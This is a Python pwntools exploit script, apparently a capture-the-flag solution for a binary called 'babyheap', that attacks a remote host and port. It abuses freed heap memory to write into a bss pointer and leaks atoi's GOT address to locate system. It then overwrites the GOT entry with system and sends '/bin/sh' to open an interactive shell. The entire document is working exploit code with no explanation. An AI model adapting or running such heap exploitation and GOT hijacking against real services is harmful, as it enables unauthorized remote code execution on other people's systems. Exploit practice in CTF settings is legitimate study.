from pwn import *
#p = process("./babyheap")
p = remote("35.243.188.20",2000)

bss =0x6020A0
atoi_got = 0x602060

#Create
p.recvuntil(">")
p.sendline("1")

#Delete
p.recvuntil(">")
p.sendline("4")

#Edit
p.recvuntil(">")
p.sendline("2")
p.recvuntil("Content? ")
p.sendline(p64(bss))

#Create
p.recvuntil(">")
p.sendline("1")

payload = chr(0x0)*40
payload += p64(atoi_got)

#Fill
p.recvuntil(">")
p.sendline("1337")
p.recvuntil("Fill ")
p.sendline(payload)

#Show
p.recvuntil(">")
p.sendline("3")
p.recvuntil("Content: ")

atoi_addr = u64(p.recvline().strip().ljust(8,chr(0x0)))
log.info("Address of atoi : "+str(hex(atoi_addr)))

system_addr = atoi_addr + 0xf010
log.info("Address of system : "+str(hex(system_addr)))

#Edit
p.recvuntil(">")
p.sendline("2")
p.recvuntil("Content? ")
p.sendline(p64(system_addr))

p.recvuntil(">")
p.sendline("/bin/sh")
p.interactive()
